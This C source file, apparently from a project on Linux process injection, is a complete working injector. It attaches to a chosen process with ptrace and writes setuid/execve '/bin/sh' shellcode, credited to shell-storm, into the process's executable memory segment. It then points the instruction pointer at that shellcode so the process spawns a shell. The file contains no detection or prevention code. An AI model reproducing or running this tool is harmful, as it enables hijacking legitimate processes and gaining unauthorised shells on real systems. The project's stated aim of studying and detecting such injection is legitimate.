/*
* Project: Process Injection Exploitation and Prevention / Detection Techniques in Linux
* Summary: Exploitation using Ptrace System Call:
* Program to inject shellcode(malicious code) in a legitimate process to grant the attacker an access to the shell using Ptrace system call.
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <unistd.h>
#include <errno.h>
#include <sys/ptrace.h>
#include <sys/user.h>
#include <stdbool.h>
#include <stdint.h>
#include <sys/wait.h>

// The shell code that is injected into the target process is taken from,
// http://shell-storm.org/shellcode/index.html website
// http://shell-storm.org/shellcode/files/shellcode-77.html
char *_shellCodePayload = "\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62"
                          "\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31"
                          "\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c"
                          "\x58\x0f\x05";


char *extractPermissionsFromMemMapLine(char *dataLine);
long getStartAddressOfExecutableMemSegment(int processId);
void printGreenTick();
long extractStartAddressOfExecutableMemSegment(char *dataLine);

/*
* Summary - This method will be used to display a green tick mark on console.
*/
void printGreenTick()
{
    printf("\033[0;32m");
    printf("\xE2\x9C\x93");
    printf("\033[0m");
}

/*
* Summary - This method will be used to get the address where the malicious code will be injected.
* Param 1 - processId - target process id
* Returns the segment starting address, after a flawless execution
*/
long getStartAddressOfExecutableMemSegment(int processId)
{
    // Declarations
    FILE *procMemMapFile;
    int fileNameLength = 100;
    char fileName[fileNameLength];
    bool dataExists = true;
    char *memMapFileLine = NULL;
    size_t memMapFileLineLength = 0;
    char *memSegPermissions = NULL;

    // 1. Get the memory mappings of the target process from the /proc/<pid>/maps file
    snprintf(fileName, fileNameLength, "/proc/%d/maps", processId);
    procMemMapFile = fopen(fileName, "r");
    if(procMemMapFile == NULL)
    {
        printf("The memory mapping file %s could not be opened.\n", fileName);
        exit(1);
    }

    while(dataExists)
    {
        if(getline(&memMapFileLine, &memMapFileLineLength, procMemMapFile) > 0)
        {
            // 2. Find the memory segment having permission "r-xp".
            // For achieving this, extract the permission part from the memMapFileLine, and check if it equals to "r-xp"
            memSegPermissions = extractPermissionsFromMemMapLine(memMapFileLine);
            if (memSegPermissions == NULL)
            {
                continue;
            }
            else
            {
                if(strncmp("r-xp", memSegPermissions, 4) == 0)
                {
                    break;
                }
            }
        }
        else
        {
            dataExists = false;
        }
    }

    // 3. Get starting address of the executable memory segment
    long startAddress = extractStartAddressOfExecutableMemSegment(memMapFileLine);

    free(memSegPermissions);
    free(memMapFileLine);

    return startAddress;
}

/*
* Summary - This method will be used to extract the starting address of the memory segment from the process map file line.
* Param 1 - dataLine - a line of process map file
* Returns the segment starting address, after a flawless execution
*/
long extractStartAddressOfExecutableMemSegment(char *dataLine)
{
    // Declarations
    int indexOfFirstDash = -1;
    size_t loopCounter = 0;
    size_t dataLength = strlen(dataLine);
    long startAddress;

    for(loopCounter = 0; loopCounter < dataLength; loopCounter++)
    {
        if (dataLine[loopCounter] == '-')
        {
            indexOfFirstDash = loopCounter;
            break;
        }
    }

    char *startAddMemSeg = malloc(indexOfFirstDash + 1);
    for(loopCounter = 0; loopCounter < indexOfFirstDash; loopCounter++)
    {
        startAddMemSeg[loopCounter] = dataLine[loopCounter];
    }
    startAddMemSeg[indexOfFirstDash] = '\0';

    startAddress = strtol(startAddMemSeg, (char **) NULL, 16);
    return startAddress;
}

/*
* Summary - This method will be used to extract the permissions of the memory segment from the process map file line.
* Param 1 - dataLine - a line of process map file
* Returns the permissions, after a flawless execution
*/
char *extractPermissionsFromMemMapLine(char *dataLine)
{
    // Declarations
    int indexOfFirstSpace = -1, indexOfSecondSpace = -1, counter = 0;
    size_t loopCounter = 0;
    size_t dataLength = strlen(dataLine);

    for(loopCounter = 0; loopCounter < dataLength; loopCounter++)
    {
        if (dataLine[loopCounter] == ' ' && indexOfFirstSpace == -1)
        {
            indexOfFirstSpace = loopCounter + 1;
            continue;
        }

        if (dataLine[loopCounter] == ' ' && indexOfSecondSpace == -1)
        {
            indexOfSecondSpace = loopCounter + 1;
            break;
        }
    }

    if(indexOfFirstSpace != -1 && indexOfSecondSpace != -1 && indexOfSecondSpace > indexOfFirstSpace)
    {
        char *memSegPermissions = malloc(indexOfSecondSpace - indexOfFirstSpace + 1);
        for(loopCounter = indexOfFirstSpace; loopCounter < indexOfSecondSpace; loopCounter++)
        {
            memSegPermissions[counter] = dataLine[loopCounter];
            counter++;
        }
        memSegPermissions[counter] = '\0';
        return memSegPermissions;
    }

    return NULL;
}

int main(int argCount, char *argumentsData[])
{
    // Declarations
    int targetProcessId = 0, ptraceCmdStatus;
    struct user_regs_struct targetProcRegisterData, updatedTargetProcRegisterData;
    size_t shellCodeSize, loopCounter;
    uint64_t *shellCodePayload;

    // Step 1 -Verify that user entered right command to run the program.
    if(argCount != 2)
    {
        puts("Incorrect command entered to run program.\n"
        "The proper format is: ./processInjection <%PID%>");
        exit(1);
    }

    // Step 2 - Get the target process id.
    if(argumentsData[1] != NULL)
    {
        // Declarations
        int argDataLength = strlen(argumentsData[1]);
        int argCount = 0;

        for(argCount = 0; argCount < argDataLength; argCount++)
        {
            if(isdigit(argumentsData[1][argCount]) == 0)
            {
                puts("The entered process id appears to be incorrect.\n"
                "Please provide valid process id.\n");
                exit(1);
            }
        }

        targetProcessId = atoi(argumentsData[1]);
    }

    // Step 3 - Check if the process is running.
    if(getpgid(targetProcessId) < 0)
    {
        printf("The process id %d doesn't exist. Please provide a valid process id.\n", targetProcessId);
        exit(1);
    }

    printGreenTick();
    printf(" The victim process with ID %d is currently running.\n", targetProcessId);

    // Step 4 - Attach to the target process to take charge of it.
    ptraceCmdStatus = ptrace(PTRACE_ATTACH, targetProcessId, NULL, NULL);
    if(ptraceCmdStatus < 0)
    {
        fprintf(stderr, "Attaching to the target process with the PTRACE_ATTACH command failed. The error is: %s\n", strerror(errno));
        exit(1);
    }
    wait(NULL);
    printGreenTick();
    printf(" Attachment to the victim process was completed successfully.\n");

    // Step 5 - Get and save the registers of the target process.
    ptraceCmdStatus = ptrace(PTRACE_GETREGS, targetProcessId, NULL, &targetProcRegisterData);
    if(ptraceCmdStatus < 0)
    {
        fprintf(stderr, "Failed to retrieve the register data of the victim process with the PTRACE_GETREGS command. The error is: %s\n", strerror(errno));
        exit(1);
    }
    printGreenTick();
    printf(" The register data of the victim process was retrieved successfully.\n");

    // Step 6
    // 1. Get the memory mappings of the target process from the /proc/<pid>/maps file
    // 2. Loop over the data obtained in the above step to find the starting address of the memory segment having "r-xp" permission.
    // The malicious code will be injected into this memory segment.
    long startAddrMemSegment = getStartAddressOfExecutableMemSegment(targetProcessId);
    printGreenTick();
    printf(" The starting address %lx of the memory segment having 'r-xp' permission was retrieved successfully.\n", startAddrMemSegment);

    // Step 7
    // Inject shell code(malicious code) at the starting address of the memory segment having "r-xp" permission.
    shellCodeSize = strlen(_shellCodePayload);
    shellCodePayload = (uint64_t *)_shellCodePayload;
    for (loopCounter = 0; loopCounter < shellCodeSize; loopCounter = loopCounter + 8)
    {
        ptraceCmdStatus = ptrace(PTRACE_POKETEXT, targetProcessId, startAddrMemSegment + loopCounter, *shellCodePayload);
        if(ptraceCmdStatus < 0)
        {
            fprintf(stderr, "Failed to inject the malicious code in the victim process with the PTRACE_POKETEXT command. The error is: %s\n", strerror(errno));
            exit(1);
        }
        shellCodePayload++;
    }
    printGreenTick();
    printf(" Injection of malicious code at address %lx was performed successfully.\n", startAddrMemSegment);

    // Step 8
    // Retrieve the saved registers of the target process and position the instruction pointer at the starting address of the memory segment,
    // where we injected the malicious code
    memcpy(&updatedTargetProcRegisterData, &targetProcRegisterData, sizeof(struct user_regs_struct));
    updatedTargetProcRegisterData.rip = startAddrMemSegment;
    ptraceCmdStatus = ptrace(PTRACE_SETREGS, targetProcessId, NULL, &updatedTargetProcRegisterData);
    if(ptraceCmdStatus < 0)
    {
        fprintf(stderr, "Failed to set the instruction pointer at the location where malicious code is injected with the PTRACE_SETREGS command. The error is: %s\n", strerror(errno));
        exit(1);
    }
    printGreenTick();
    printf(" Setting the instruction pointer to point at malicious code was performed successfully.\n");

    // Step 9
    // Injection is successful, resume target process
    ptraceCmdStatus = ptrace(PTRACE_CONT, targetProcessId, NULL, NULL);
    if(ptraceCmdStatus < 0)
    {
        fprintf(stderr, "Failed to resume the target process with the PTRACE_CONT command. The error is: %s\n", strerror(errno));
        exit(1);
    }
    printGreenTick();
    printf(" The malicious code was injected successfully.\n");

    exit(0);
}
